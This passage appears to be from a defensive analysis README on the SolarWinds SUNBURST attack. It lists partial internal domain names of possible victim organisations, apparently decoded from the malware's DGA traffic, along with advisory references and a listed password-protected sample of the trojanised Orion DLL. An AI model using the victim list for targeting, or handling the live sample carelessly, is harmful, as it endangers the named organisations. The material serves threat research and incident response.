## Possible victims after decrypting dga (Cleared list)
```
admin.callidusc
ad.optimizely.
aerioncorp.com
ah.org
amr.corp.intel
bi.corp
c4e-internal.c
ci.dublin.ca.
corp.dvd.com
coxnet.cox.com
csa.local
detmir-group.r
e-idsolutions
fa.lcl
ftfcu.corp
gksm.local
glu.com
gncu.local
inf.dc.net
intensive.int
int.lukoil-int
its.iastate.ed
neophotonics.co
nvidia.com
internal.hws.o
repsrv.com
scentral.pima.g
sc.pima.gov
sos-ad.state.
thoughtspot.int
uis.kent.edu
.vestfor.dk
wfhf1.hewlett.
woodruff-sawyer
```

## References
- https://www.solarwinds.com/security/security-statement
- https://github.com/fireeye/sunburst_countermeasures
- https://www.fireeye.com/blog/products-and-services/2020/12/fireeye-shares-details-of-recent-cyber-attack-actions-to-protect-community.html
- https://www.zdnet.com/article/microsoft-fireeye-confirm-solarwinds-supply-chain-attack/
- https://cyber.dhs.gov/ed/21-01/

## Files
- SolarWinds.Orion.Core.BusinessLayer.dll.zip pass: infected

## Mapped Attacks Refs
[https://tools.qeeqbox.com/mitre-visualizer.html](https://tools.qeeqbox.com/mitre-visualizer.html)

<img src="https://raw.githubusercontent.com/qeeqbox/mitre-visualizer/main/readme/intro.png" style="max-width:768px"/>
